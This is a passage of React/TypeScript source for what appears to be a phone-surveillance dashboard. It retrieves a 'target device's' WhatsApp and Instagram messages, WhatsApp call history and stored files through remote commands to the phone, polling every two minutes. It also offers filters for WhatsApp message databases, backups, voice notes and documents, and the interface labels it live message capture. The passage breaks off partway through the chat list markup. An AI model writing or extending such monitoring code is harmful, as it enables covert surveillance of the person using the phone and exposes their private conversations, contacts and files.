      // 4. Dispatch fetch request for this newly clicked chat
      requestChatFromMobileApp(c.chatName, false);
    } else {
      // User clicked already active chat to force re-sync
      requestChatFromMobileApp(c.chatName, false);
    }
  };

  // --------------------------------------------------------------------------
  // 3. LOAD CHAT CONVERSATION MESSAGES (LIVE POLLING & LAST 5 DAYS)
  // --------------------------------------------------------------------------
  const whatsappChatSummariesRef = useRef(whatsappChatSummaries);
  whatsappChatSummariesRef.current = whatsappChatSummaries;


  useEffect(() => {
    if (!selectedChatId) {
      setActiveThreadMessages([]);
      return;
    }

    const currentChatName = selectedChatId;
    const isInstagram = selectedApp === "instagram";
    let isMounted = true;

    const fetchChatMessages = (isInitial: boolean) => {
      // Only show full loading spinner if no messages are currently rendered
      if (isInitial && activeThreadMessages.length === 0) setMessagesLoading(true);

      const fetchPromise = isInstagram
        ? devicesApi.instagramMessages(deviceId, currentChatName)
        : devicesApi.whatsAppMessages(deviceId, currentChatName);

      fetchPromise
        .then((msgs: (WhatsAppMessage | InstagramMessage)[]) => {
          if (!isMounted) return;
          if (selectedChatIdRef.current !== currentChatName) return;

          // Do NOT drop messages using client-side strict date filters!
          // When the user clicked this chat, the mobile app already gathered the last 2 days
          // conversation and the server stored it in DB. Show whatever is in the DB as-is!
          const filtered = (msgs || []).filter((m) => {
            if (!m.message_text && !m.media_path && !(m as any).reel_url) return false;
            const text = (m.message_text || "").trim();
            if (
              (isContactSyncPlaceholder(text) || text.includes("@s.whatsapp.net") || text.includes("@g.us")) &&
              !m.media_path &&
              !(m as any).reel_url
            ) {
              return false;
            }

            // Exclude summary notification titles
            if (
              currentChatName.match(/^\s*\d+\s+messages?\s+from\s+\d+\s+chats?/i) ||
              ((m as any).chat_name && (m as any).chat_name.match(/^\s*\d+\s+messages?\s+from\s+\d+\s+chats?/i))
            ) {
              return false;
            }

            // Strict chat isolation: ensure message belongs to the current chat
            if ((m as any).chat_name) {
              const msgChat = String((m as any).chat_name).trim().toLowerCase();
              const currChat = currentChatName.trim().toLowerCase();
              if (msgChat !== currChat) {
                return false;
              }
            }

            // If sender has "Sender @ GroupName", ensure it matches the current group
            if (m.sender && /@/.test(m.sender)) {
              const parts = m.sender.split(/\s*@\s*/);
              if (parts.length > 1) {
                const groupPart = parts[1].trim().toLowerCase();
                const currChat = currentChatName.trim().toLowerCase();
                if (groupPart && groupPart !== currChat) {
                  return false;
                }
              }
            }

            return true;
          });

          const unified: UnifiedChatMessage[] = filtered.map((m) => {
            const rawText = m.message_text || "";
            const isTargetSent =
              Boolean(m.is_outgoing) ||
              m.sender?.toLowerCase() === "me" ||
              m.sender?.toLowerCase() === "you" ||
              m.sender?.toLowerCase() === "target device" ||
              rawText.startsWith("You: ") ||
              rawText.startsWith("You reacted ");
            const cleanText = rawText.startsWith("You: ") ? rawText.slice(5).trim() : rawText;

            // Instagram Reel link detection: check reel_url property or URL regex
            const reelUrl =
              (m as any).reel_url ||
              (cleanText.match(/https?:\/\/(?:www\.)?instagram\.com\/(?:reel|p|tv)\/[A-Za-z0-9_-]+/)?.[0] || null);

            const isImage =
              m.media_type === "image" ||
              cleanText.includes("📷") ||
              cleanText.toLowerCase().includes("photo");

            const rawSender = m.sender || currentChatName;
            const cleanSender = isTargetSent
              ? "Target Device"
              : (rawSender.includes("@") ? rawSender.split(/\s*@\s*/)[0].trim() : rawSender);

            return {
              id: m.id,
              sender: cleanSender,
              text: cleanText,
              isOutgoing: isTargetSent,
              timestamp: m.message_time,
              mediaType: reelUrl ? "reel" : (isImage ? "image" : m.media_type),
              mediaPath: m.media_path,
              reelUrl: reelUrl,
              targetAccount: (m as any).target_account || null,
            };
          });

          // If initial load or user switched chat, directly set unified messages for this chat
          if (isInitial) {
            setActiveThreadMessages(unified);
            return;
          }

          // Background auto-sync / live polling: update only if new messages or changes exist
          setActiveThreadMessages((prev) => {
            if (unified.length === 0 && prev.length > 0) return prev;
            if (prev.length === 0) return unified;
            if (prev.length === unified.length) {
              let isIdentical = true;
              for (let i = 0; i < prev.length; i++) {
                if (
                  prev[i].id !== unified[i].id ||
                  prev[i].text !== unified[i].text ||
                  prev[i].isOutgoing !== unified[i].isOutgoing ||
                  prev[i].mediaPath !== unified[i].mediaPath ||
                  prev[i].reelUrl !== unified[i].reelUrl
                ) {
                  isIdentical = false;
                  break;
                }
              }
              if (isIdentical) return prev; // Zero re-renders, zero flicker
            }
            return unified;
          });
        })
        .catch((err) => {
          if (!isMounted) return;
          console.warn("Failed to load messages:", err);
        })
        .finally(() => {
          if (isMounted) setMessagesLoading(false);
        });
    };

    fetchCurrentChatRef.current = fetchChatMessages;
    fetchChatMessages(true);

    return () => {
      isMounted = false;
      fetchCurrentChatRef.current = null;
    };
  }, [selectedChatId, deviceId, timeFilter, selectedApp]);

  // Grouped conversation messages by day (Today, Yesterday, etc.)
  const groupedMessages = useMemo(() => {
    const groups: { dateLabel: string; items: UnifiedChatMessage[] }[] = [];
    activeThreadMessages.forEach((msg) => {
      const label = getMessageDateGroup(msg.timestamp);
      const existing = groups.find((g) => g.dateLabel === label);
      if (existing) {
        existing.items.push(msg);
      } else {
        groups.push({ dateLabel: label, items: [msg] });
      }
    });
    return groups;
  }, [activeThreadMessages]);

  const selectedChatSummary = useMemo(() => {
    const list = selectedApp === "instagram" ? instagramChatSummaries : whatsappChatSummaries;
    return list.find((c) => c.id === selectedChatId) || null;
  }, [selectedApp, instagramChatSummaries, whatsappChatSummaries, selectedChatId]);

  // --------------------------------------------------------------------------
  // 2-MINUTE AUTOMATIC RECURRING SYNC & COUNTDOWN LOOP
  // --------------------------------------------------------------------------
  const selectedChatSummaryRef = useRef(selectedChatSummary);
  selectedChatSummaryRef.current = selectedChatSummary;

  const requestChatRef = useRef(requestChatFromMobileApp);
  requestChatRef.current = requestChatFromMobileApp;

  const handleManualSyncNow = () => {
    if (!selectedChatSummary) return;
    setCountdownSeconds(120);
    requestChatFromMobileApp(selectedChatSummary.chatName, false);
  };

  useEffect(() => {
    if (!autoSyncEnabled || !selectedChatId) return;

    const interval = setInterval(() => {
      setCountdownSeconds((prev) => {
        if (prev <= 1) {
          if (selectedChatSummaryRef.current?.chatName) {
            requestChatRef.current(selectedChatSummaryRef.current.chatName, true);
          }
          return 120;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [autoSyncEnabled, selectedChatId]);

  // --------------------------------------------------------------------------
  // 4. STORAGE / FILE MANAGER ACTIONS
  // --------------------------------------------------------------------------
  async function pollCommand(commandId: string, label: string) {
    setFileStatus(`${label}: waiting for device response...`);
    for (let i = 0; i < 25; i++) {
      const delay = i < 6 ? 1000 : 2000;
      await new Promise((r) => setTimeout(r, delay));
      try {
        const cmd = await devicesApi.getCommand(deviceId, commandId);
        if (cmd.status === "acked") {
          setFileStatus(`${label}: completed.`);
          return cmd;
        }
        if (cmd.status === "failed") {
          setFileStatus(`${label}: failed.`);
          return cmd;
        }
      } catch {
        // retry
      }
    }
    setFileStatus(`${label}: device response took longer.`);
    return null;
  }

  async function handleScanWhatsAppFiles() {
    setFilesLoading(true);
    setFiles(null);
    setCurrentPath("");
    setFileStatus("Requesting WhatsApp files from device...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "whatsapp_file_list");
      const result = await pollCommand(cmd.id, "WhatsApp File Scan");
      if (result?.status === "acked") {
        const full = await devicesApi.getCommand(deviceId, cmd.id);
        const fileList = (full.result?.files as FileEntryDtoLocal[]) || [];
        setFiles(fileList);
        if (fileList.length > 0) {
          const firstDir = fileList.find((f) => f.isDirectory);
          if (firstDir) setCurrentPath(parentOf(firstDir.path));
        }
      }
    } catch (e) {
      setFileStatus(`Failed to scan files: ${(e as Error).message}`);
    } finally {
      setFilesLoading(false);
    }
  }

  async function handleDownloadMedia(filePath: string, fileName: string) {
    setDownloadingFile(filePath);
    setFileStatus(`Downloading ${fileName}...`);
    try {
      if (filePath.startsWith("http://") || filePath.startsWith("https://")) {
        const a = document.createElement("a");
        a.href = filePath;
        a.download = fileName;
        a.target = "_blank";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setFileStatus(`Downloaded ${fileName}.`);
      } else {
        const cmd = await devicesApi.createCommand(deviceId, "file_download", { path: filePath });
        const downloadPromise = downloadFileViaRelay(cmd.id, (s) => setFileStatus(s));
        await pollCommand(cmd.id, `Download: ${fileName}`);
        await downloadPromise;
        setFileStatus(`Downloaded ${fileName}.`);
      }
    } catch (e) {
      setFileStatus(`Download failed: ${(e as Error).message}`);
    } finally {
      setDownloadingFile(null);
    }
  }

  const directoryChildren = useMemo(() => {
    if (!files) return [];
    let list = files;
    if (categoryFilter === "images") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("images") ||
          f.mimeType?.startsWith("image/") ||
          /\.(jpg|jpeg|png|webp)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "voice") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("voice notes") ||
          f.path.toLowerCase().includes("audio") ||
          /\.(opus|ogg|mp3|m4a|wav)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "docs") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("documents") ||
          /\.(pdf|doc|docx|txt|xlsx|pptx)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "db") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("databases") ||
          f.path.toLowerCase().includes("backups") ||
          /\.(crypt\d+|db|bak)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }

    return list
      .filter((f) => parentOf(f.path) === currentPath)
      .sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }, [files, currentPath, categoryFilter]);

  const breadcrumbs = currentPath ? currentPath.split("/").filter(Boolean) : [];

  return (
    <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
      {/* ===================================================================== */}
      {/* TOP HEADER: SECTION BANNER & LIVE SYNC STATUS                         */}
      {/* ===================================================================== */}
      <div className="px-5 py-3.5 border-b border-gray-100 bg-gradient-to-r from-gray-50 via-white to-gray-50 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-emerald-500/10 text-emerald-600 flex items-center justify-center font-bold text-lg shadow-xs">
            💬
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-base font-bold text-gray-900 tracking-tight">Apps</h2>
              <span className="text-[11px] font-semibold uppercase px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                Live Sync Active
              </span>
            </div>
            <p className="text-xs text-gray-500">
              Live mobile chat conversations (last 5 days activity) and media storage
            </p>
          </div>
        </div>

        {/* Action Controls & Last Synced */}
        <div className="flex items-center gap-3">
          <span className="text-[11px] text-gray-400 hidden sm:inline">
            Updated: {lastSyncedTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
          </span>

          {selectedApp === "whatsapp" && (
            <div className="bg-gray-100 p-0.5 rounded-lg flex text-xs font-medium">
              <button
                type="button"
                onClick={() => setActiveView("chats")}
                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                  activeView === "chats"
                    ? "bg-white text-gray-900 shadow-xs font-semibold"
                    : "text-gray-500 hover:text-gray-900"
                }`}
              >
                <span>💬</span>
                <span>Chats & Contacts</span>
              </button>
              <button
                type="button"
                onClick={() => setActiveView("files")}
                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                  activeView === "files"
                    ? "bg-white text-gray-900 shadow-xs font-semibold"
                    : "text-gray-500 hover:text-gray-900"
                }`}
              >
                <span>📁</span>
                <span>Files</span>
              </button>
            </div>
          )}

          <button
            type="button"
            onClick={() => loadDeviceChatData(true)}
            disabled={loading}
            className="text-xs text-gray-500 hover:text-emerald-600 px-2.5 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1.5 disabled:opacity-50"
            title="Refresh from phone now"
          >
            <span className={loading ? "animate-spin" : ""}>↻</span>
            <span className="font-medium">{loading ? "Syncing..." : "Refresh"}</span>
          </button>
        </div>
      </div>

      {/* ===================================================================== */}
      {/* THREE-COLUMN WORKSPACE: APPS RAIL | CHATLIST | CHAT CONVERSATION      */}
      {/* ===================================================================== */}
      <div className="flex flex-col md:flex-row h-[720px] overflow-hidden bg-white">
        {/* =================================================================== */}
        {/* COLUMN 1: APPS RAIL (LEFT)                                          */}
        {/* =================================================================== */}
        <div className="w-full md:w-56 lg:w-64 shrink-0 border-r border-gray-100 bg-gray-50/70 p-3 space-y-3 flex flex-col h-full min-h-0 overflow-hidden">
          <div className="px-2 pt-1 flex items-center justify-between shrink-0">
            <h3 className="text-[10px] font-bold uppercase tracking-wider text-gray-400">
              Applications
            </h3>
          </div>

          <div className="space-y-1.5 flex-1 min-h-0 overflow-y-auto">
            {SUPPORTED_APPS.map((app) => {
              const isSelected = selectedApp === app.id;
              const count = app.id === "whatsapp" ? whatsappPersonalChats.length : app.id === "instagram" ? instagramChats.length : 0;

              return (
                <button
                  key={app.id}
                  id={`app-tab-${app.id}`}
                  type="button"
                  onClick={() => {
                    if (selectedApp !== app.id) {
                      setSelectedApp(app.id);
                      setSelectedChatId(null);
                      setActiveThreadMessages([]);
                      setSyncProgress(null);
                      if (app.id !== "whatsapp") setActiveView("chats");
                    }
                  }}
                  className={`w-full text-left p-2.5 rounded-xl transition flex items-center gap-3 relative ${
                    isSelected
                      ? `bg-white shadow-xs border border-gray-200/90 ring-1 ${app.id === "instagram" ? "ring-pink-500/30" : "ring-emerald-500/20"}`
                      : "hover:bg-white/60 text-gray-700"
                  }`}
                >
                  {/* Brand Icon */}
                  <div
                    className="w-9 h-9 rounded-lg flex items-center justify-center shrink-0 transition"
                    style={{
                      backgroundColor: `${app.color}15`,
                      color: app.color,
                    }}
                  >
                    {app.id === "whatsapp" && <WhatsAppLogo className="w-5 h-5" />}
                    {app.id === "instagram" && <InstagramLogo className="w-5 h-5" />}
                  </div>

                  {/* App Details */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-1">
                      <span className="text-xs font-bold text-gray-900 truncate">
                        {app.name}
                      </span>
                      {isSelected && (
                        <span className={`w-2 h-2 rounded-full shrink-0 ${app.id === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                      )}
                    </div>
                    <div className="flex items-center gap-1.5 mt-0.5">
                      <span
                        className={`text-[9px] font-semibold px-1.5 py-0.2 rounded ${
                          app.isSupported
                            ? app.id === "instagram"
                              ? "bg-pink-100 text-pink-800"
                              : "bg-emerald-100 text-emerald-800"
                            : "bg-gray-200/70 text-gray-600"
                        }`}
                      >
                        {app.badge}
                      </span>
                      {app.isSupported && (
                        <span className="text-[10px] text-gray-400 font-medium">
                          {count} {count === 1 ? "chat" : "chats"}
                        </span>
                      )}
                    </div>
                  </div>
                </button>
              );
            })}
          </div>

          {selectedApp === "instagram" ? (
            <div className="p-2.5 rounded-xl bg-gradient-to-br from-pink-50 via-rose-50 to-purple-50 border border-pink-200/90 text-[11px] text-pink-900 space-y-1 shrink-0 shadow-2xs">
              <p className="font-bold flex items-center gap-1.5 text-xs text-pink-950">
                <span className="w-5 h-5 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-[10px] shadow-2xs">
                  📸
                </span>
                <span>Instagram Direct Messages</span>
              </p>
              <p className="text-[10px] text-pink-800 leading-tight">
                Incoming notifications and direct messages captured from target device.
              </p>
            </div>
          ) : (
            <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1 shrink-0">
              <p className="font-semibold flex items-center gap-1">
                <span>📱</span>
                <span>WhatsApp Chats & Activity</span>
              </p>
              <p className="text-[10px] text-emerald-700 leading-tight">
                Shows WhatsApp chats (Team lead, Kavin Bro, etc.), broadcast channels, and last 5 days calls from this device.
              </p>
            </div>
          )}
        </div>

        {/* =================================================================== */}
        {/* NON-SUPPORTED APPS (TELEGRAM, INSTAGRAM, MESSENGER)                 */}
        {/* =================================================================== */}

        {/* =================================================================== */}
        {/* ACTIVE APP: CHAT VIEW (COLUMN 2: CHATLIST | COLUMN 3: CONVERSATION) */}
        {/* =================================================================== */}
        {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported &&
          activeView === "chats" && (
            <>
              {/* ----------------------------------------------------------- */}
              {/* COLUMN 2: COMPLETE CHATLIST & CONTACTS FROM MOBILE PHONE    */}
              {/* ----------------------------------------------------------- */}
              <div className="w-full md:w-80 lg:w-96 shrink-0 border-r border-gray-100 flex flex-col bg-white h-full min-h-0 overflow-hidden">
                {/* Search Bar */}
                <div className="p-3 border-b border-gray-100 bg-gray-50/50 space-y-2 shrink-0">
                  <div className="relative">
                    <input
                      type="text"
                      placeholder={
                        selectedApp === "instagram"
                          ? "Search Instagram direct chats..."
                          : chatCategory === "calls"
                          ? "Search WhatsApp calls & numbers..."
                          : chatCategory === "channels"
                          ? "Search channels..."
                          : "Search WhatsApp chats..."
                      }
                      value={chatSearch}
                      onChange={(e) => setChatSearch(e.target.value)}
                      className="w-full text-xs pl-8 pr-7 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
                    />
                    <span className="absolute left-2.5 top-2.5 text-gray-400 text-xs">🔍</span>
                    {chatSearch && (
                      <button
                        type="button"
                        onClick={() => setChatSearch("")}
                        className="absolute right-2.5 top-2.5 text-gray-400 hover:text-gray-600 text-xs"
                      >
                        ✕
                      </button>
                    )}
                  </div>

                  {/* Tabs: WhatsApp (Chats | Channels | Calls) vs Instagram (Direct Messages) */}
                  {selectedApp === "whatsapp" ? (
                    <div className="bg-gray-200/70 p-1 rounded-lg grid grid-cols-3 text-[11px] font-semibold gap-1">
                      <button
                        type="button"
                        onClick={() => setChatCategory("chats")}
                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                          chatCategory === "chats"
                            ? "bg-white text-emerald-900 shadow-xs font-bold"
                            : "text-gray-600 hover:text-gray-900"
                        }`}
                      >
                        <span className="truncate">💬 Chats</span>
                        <span
                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
                            chatCategory === "chats"
                              ? "bg-emerald-100 text-emerald-800"
                              : "bg-gray-300/80 text-gray-700"
                          }`}
                        >
                          {whatsappPersonalChats.length}
                        </span>
                      </button>
                      <button
                        type="button"
                        onClick={() => setChatCategory("channels")}
                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                          chatCategory === "channels"
                            ? "bg-white text-purple-900 shadow-xs font-bold"
                            : "text-gray-600 hover:text-gray-900"
                        }`}
                      >
                        <span className="truncate">📢 Channels</span>
                        <span
                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
                            chatCategory === "channels"
                              ? "bg-purple-100 text-purple-800"
                              : "bg-gray-300/80 text-gray-700"
                          }`}
                        >
                          {channelChats.length}
                        </span>
                      </button>
                      <button
                        type="button"
                        onClick={() => setChatCategory("calls")}
                        className={`py-1.5 px-1 rounded-md transition flex items-center justify-center gap-1.5 ${
                          chatCategory === "calls"
                            ? "bg-white text-blue-900 shadow-xs font-bold"
                            : "text-gray-600 hover:text-gray-900"
                        }`}
                      >
                        <span className="truncate">📞 Calls</span>
                        <span
                          className={`text-[9px] px-1.5 py-0.2 rounded-full font-bold ${
                            chatCategory === "calls"
                              ? "bg-blue-100 text-blue-800"
                              : "bg-gray-300/80 text-gray-700"
                          }`}
                        >
                          {whatsAppCalls.length}
                        </span>
                      </button>
                    </div>
                  ) : (
                    <div className="bg-gradient-to-r from-purple-500/10 via-pink-500/10 to-rose-500/10 p-2.5 rounded-xl border border-pink-200/70 space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 min-w-0">
                          <div className="w-7 h-7 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[1.5px] shadow-2xs shrink-0">
                            <div className="w-full h-full rounded-full bg-white flex items-center justify-center font-bold text-[9px] text-pink-700">
                              IG
                            </div>
                          </div>
                          <div className="min-w-0">
                            <p className="text-xs font-bold text-gray-900 leading-tight">
                              Instagram Direct
                            </p>
                            <p className="text-[10px] text-gray-500 font-medium">
                              Live Message Capture
                            </p>
                          </div>
                        </div>
                        <span className="shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full border flex items-center gap-1 bg-emerald-100 text-emerald-800 border-emerald-200">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                          Live Monitor
                        </span>
                      </div>
                      <div className="flex items-center justify-between pt-1 border-t border-pink-200/50 text-[11px] font-semibold text-gray-700">
                        <span className="flex items-center gap-1">
                          <span>💬</span> Direct Messages
                        </span>
                        <div className="flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={() => loadDeviceChatData(true)}
                            disabled={loading}
                            title="Trigger Instagram account & chat sync from target phone"
                            className="text-[9px] font-bold px-2 py-0.5 rounded bg-pink-600 hover:bg-pink-700 text-white transition-colors cursor-pointer flex items-center gap-1 disabled:opacity-50"
                          >
                            <span>↻</span> {loading ? "Syncing..." : "Sync Phone"}
                          </button>
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-pink-100 text-pink-700 border border-pink-200">
                            {instagramChats.length} {instagramChats.length === 1 ? "chat" : "chats"}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="flex items-center justify-between text-[10px] text-gray-400 px-1 pt-0.5">
                    <span>
                      {selectedApp === "instagram"
                        ? `${displayedChats.length} ${displayedChats.length === 1 ? "chat" : "chats"} (DMs)`
                        : chatCategory === "calls"
                        ? `${displayedCalls.length} ${displayedCalls.length === 1 ? "call" : "calls"} (last 5 days)`
                        : chatCategory === "channels"
                        ? `${displayedChats.length} ${displayedChats.length === 1 ? "channel" : "channels"}`
                        : `${displayedChats.length} ${displayedChats.length === 1 ? "chat" : "chats"}`}
                    </span>
                    <span className={`font-semibold flex items-center gap-1 ${selectedApp === "instagram" ? "text-pink-600" : "text-emerald-600"}`}>
                      <span className={`w-1.5 h-1.5 rounded-full animate-pulse ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                      Live Real-Time
                    </span>
                  </div>
                </div>

                {/* List Container: Calls View or Chats/Channels View */}
                <div className="flex-1 min-h-0 overflow-y-auto divide-y divide-gray-100 overscroll-contain">
                  {chatCategory === "calls" && selectedApp === "whatsapp" ? (
                    /* ================= CALLS LIST (LAST 5 DAYS) ================= */
                    loading && whatsAppCalls.length === 0 ? (
                      <div className="p-8 text-center text-xs text-gray-400 space-y-1">
                        <span className="animate-spin text-lg block">↻</span>
                        <p>Loading WhatsApp calls from last 5 days...</p>
                      </div>
                    ) : displayedCalls.length === 0 ? (
                      <div className="p-8 text-center text-xs text-gray-400 space-y-2">
                        <span className="text-2xl block">📞</span>
                        <p className="font-semibold text-gray-700">No calls in the last 5 days</p>
                        <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
                          Incoming, outgoing, and missed WhatsApp calls recorded from this phone in the last 5 days will appear here.
                        </p>
                      </div>
                    ) : (
                      displayedCalls.map((call) => {
                        const isSelected = selectedCallId === call.id;
                        const isMissed = call.direction === "missed";
                        const isOutgoing = call.direction === "outgoing";

                        return (
                          <div
                            key={call.id}
                            onClick={() => setSelectedCallId(call.id)}
                            className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
                              isSelected
                                ? "bg-blue-50/70 border-l-4 border-blue-500 shadow-2xs"
                                : "hover:bg-gray-50/80"
                            }`}
                          >
                            {/* Call Avatar & Direction Indicator */}
                            <div
                              className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
                                isMissed
                                  ? "bg-rose-500"
                                  : isOutgoing
                                  ? "bg-blue-600"
                                  : "bg-emerald-600"
                              }`}
                            >
                              {isMissed ? "📵" : call.call_type === "video" ? "📹" : "📞"}
                              <span
                                className={`absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${
                                  isMissed ? "bg-rose-400" : isOutgoing ? "bg-blue-400" : "bg-emerald-400"
                                }`}
                              />
                            </div>

                            {/* Call Details */}
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center justify-between gap-1 mb-0.5">
                                <h4 className="text-xs font-bold text-gray-900 truncate">
                                  {call.name || call.number || "WhatsApp Contact"}
                                </h4>
                                <span className="text-[10px] text-gray-400 shrink-0 font-medium">
                                  {formatChatTime(call.timestamp)}
                                </span>
                              </div>

                              {call.number && call.number !== call.name && (
                                <p className="text-[10px] text-gray-500 font-mono truncate mb-0.5">
                                  {call.number}
                                </p>
                              )}

                              {/* Direction & Status info */}
                              <div className="flex items-center gap-1.5 text-[11px] text-gray-600 leading-snug">
                                {isMissed ? (
                                  <span className="text-rose-600 font-semibold flex items-center gap-1 text-[11px]">
                                    <span>📵</span>
                                    <span>Missed {call.call_type === "video" ? "video call" : "voice call"}</span>
                                  </span>
                                ) : isOutgoing ? (
                                  <span className="text-blue-600 font-semibold flex items-center gap-1 text-[11px]">
                                    <span>↗</span>
                                    <span>Outgoing {call.call_type === "video" ? "video call" : "voice call"}</span>
                                  </span>
                                ) : (
                                  <span className="text-emerald-600 font-semibold flex items-center gap-1 text-[11px]">
                                    <span>↙</span>
                                    <span>Incoming {call.call_type === "video" ? "video call" : "voice call"}</span>
                                  </span>
                                )}
                              </div>

                              <div className="mt-1 flex items-center gap-1.5">
                                {call.duration_sec > 0 && (
                                  <span className="text-[9px] font-mono font-medium bg-gray-100 text-gray-700 px-1.5 py-0.2 rounded">
                                    ⏱ {formatCallDuration(call.duration_sec)}
                                  </span>
                                )}
                                <span
                                  className={`text-[9px] font-semibold uppercase px-1.5 py-0.2 rounded border ${
                                    isMissed
                                      ? "bg-rose-50 text-rose-700 border-rose-200"
                                      : isOutgoing
                                      ? "bg-blue-50 text-blue-700 border-blue-200"
                                      : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                  }`}
                                >
                                  {isMissed ? "Missed" : isOutgoing ? "Outgoing" : "Incoming"}
                                </span>
                                <span className="text-[9px] font-semibold text-gray-500 bg-gray-50 border border-gray-200 px-1 py-0.2 rounded">
                                  Last 5 Days
                                </span>
                              </div>
                            </div>
                          </div>
                        );
                      })
                    )
                  ) : (
                    /* ================= CHATS & CHANNELS LIST ================= */
                    loading && activeCategoryChats.length === 0 ? (
                      <div className="p-8 text-center text-xs text-gray-400 space-y-1">
                        <span className="animate-spin text-lg block">↻</span>
                        <p>
                          Loading {selectedApp === "instagram" ? "Instagram chats" : chatCategory === "channels" ? "channels" : "chats"} from phone...
                        </p>
                      </div>
                    ) : displayedChats.length === 0 ? (
                      <div className="p-8 text-center text-xs text-gray-400 space-y-2">
                        <span className="text-2xl block">
                          {selectedApp === "instagram" ? "📸" : chatCategory === "channels" ? "📢" : "💬"}
                        </span>
                        <p className="font-semibold text-gray-700">
                          {selectedApp === "instagram"
                            ? "No Instagram chats found"
                            : chatCategory === "channels"
                            ? "No WhatsApp channels found"
                            : "No WhatsApp chats found"}
                        </p>
                        <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
                          {selectedApp === "instagram"
                            ? "Instagram Direct messages, DMs, and shared Reels from this phone will appear here."
                            : chatCategory === "channels"
                            ? "WhatsApp broadcast channels and community updates from this phone appear here."
                            : "WhatsApp chats (e.g. Team lead, Kavin Bro, Niklaus) from this phone appear here."}
                        </p>
                      </div>
                    ) : (
                      displayedChats.map((c) => {
                        const isSelected = selectedChatId === c.id;
                        const isChannelItem = isWhatsAppChannel(c);
                        const isInstagram = c.source === "instagram";
                        const isRequestingThis = requestingChat === c.chatName;
                        return (
                          <div
                            key={c.id}
                            onClick={() => handleSelectChat(c)}
                            className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
                              isSelected
                                ? isInstagram
                                  ? "bg-pink-50/60 border-l-4 border-pink-500 shadow-2xs"
                                  : "bg-emerald-50/60 border-l-4 border-emerald-500 shadow-2xs"
                                : "hover:bg-gray-50/80"
                            }`}
                          >
                            {/* Avatar */}
                            <div
                              className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white relative ${
                                isInstagram
                                  ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
                                  : isChannelItem
                                  ? "bg-gradient-to-br from-purple-500 to-indigo-600"
                                  : "bg-gradient-to-br from-emerald-500 to-teal-600"
                              }`}
                            >
                              {isInstagram ? c.chatName.charAt(0).toUpperCase() : isChannelItem ? "📢" : c.chatName.charAt(0).toUpperCase()}
                              <span
                                className={`absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${
                                  isInstagram ? "bg-pink-400" : isChannelItem ? "bg-indigo-400" : "bg-emerald-400"
                                }`}
                              />
                            </div>

                            {/* Chat / Channel Information */}
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center justify-between gap-1 mb-0.5">
                                <h4 className="text-xs font-bold text-gray-900 truncate">
                                  {c.chatName}
                                </h4>
